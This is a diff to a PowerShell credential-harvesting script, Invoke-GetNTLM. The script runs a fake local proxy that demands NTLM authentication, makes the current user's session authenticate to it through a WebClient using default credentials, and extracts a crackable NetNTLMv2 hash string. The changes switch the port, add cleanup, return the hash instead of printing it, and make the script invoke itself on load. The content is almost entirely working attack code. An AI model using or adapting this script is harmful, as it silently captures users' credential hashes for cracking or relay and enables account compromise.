@@ -101,13 +101,13 @@ function Invoke-GetNTLM {
 
     $Encoding = new-object system.text.asciiencoding
     $Buffer = new-object system.byte[] 1024
-    $endpoint = new-object System.Net.IPEndPoint ([System.Net.IPAddress]::Loopback, 8080)
+    $endpoint = new-object System.Net.IPEndPoint ([System.Net.IPAddress]::Loopback, 3337)
     $listener = new-object System.Net.Sockets.TcpListener $endpoint
     $listener.start()
 
     $startTime = Get-Date
     $timeout = 5
-
+    try {
     while ($true) {
         $currentTime = Get-Date
         $elapsedTime = ($currentTime - $startTime).TotalSeconds
@@ -142,6 +142,7 @@ function Invoke-GetNTLM {
                             $res = "HTTP/1.1 407 Proxy Authorization Required`r`nProxy-Authenticate: Negotiate " + $t + "`r`nContent-Type: text/html`r`nContent-Length: " + $e.length.tostring() + "`r`n`r`n" + $e
                             $writer.write($res)
                             $writer.flush()
+
                         }
                         if ($b.substring(8 * 2, 4 * 2) -eq "03000000") {
                             $offset_NTLMresponse = hextoint $b.substring(24 * 2, 4 * 2)
@@ -156,14 +157,11 @@ function Invoke-GetNTLM {
                             $user = $b.substring($offset_user * 2, $length_user * 2)
                             $user = hextostr $user
                             $domain = hextostr $domain
-                            Write-Host ""
-                            Write-Host ""
-                            Write-Host $user"::"$domain":"$code":"$NTProofStr":"$NTLMresponse
-                            Write-Host ""
-                            Write-Host ""
+                            [string]$String = "$($user)::$($domain):$($code):$($NTProofStr):$($NTLMresponse)"
                             $res = "HTTP/1.1 200 OK`r`nContent-Type: text/html`r`nContent-Length: " + $e2.length.tostring() + "`r`n`r`n" + $e2
                             $writer.write($res)
                             $writer.flush()
+                            return $string
                         }
                     } else {
                         $res = "HTTP/1.1 407 Proxy Authorization Required`r`nProxy-Authenticate: Negotiate`r`nProxy-Authenticate: NTLM`r`nContent-Type: text/html`r`nContent-Length: " + $e.length.tostring() + "`r`n`r`n" + $e
@@ -181,13 +179,16 @@ function Invoke-GetNTLM {
     }
 
     $listener.Stop()
+    }
+
+    finally {$listener.Stop()}
 }
 
 $job = Start-Job -ScriptBlock $ScriptBlock
 Start-Sleep -Seconds 1
 
 $wc = New-Object System.Net.WebClient
-$WebProxy = New-Object System.Net.WebProxy("http://127.0.0.1:8080", $true)
+$WebProxy = New-Object System.Net.WebProxy("http://127.0.0.1:3337", $true)
 $WebProxy.UseDefaultCredentials = $true
 $wc.Proxy = $WebProxy
 $wc.DownloadString("http://www.google.com") | Out-Null
@@ -199,4 +200,4 @@ Write-Host $Output -ForegroundColor "Yellow"
 Stop-Job -Job $job
 Remove-Job -Job $job -Force
 
-}
+} Invoke-GetNTLM
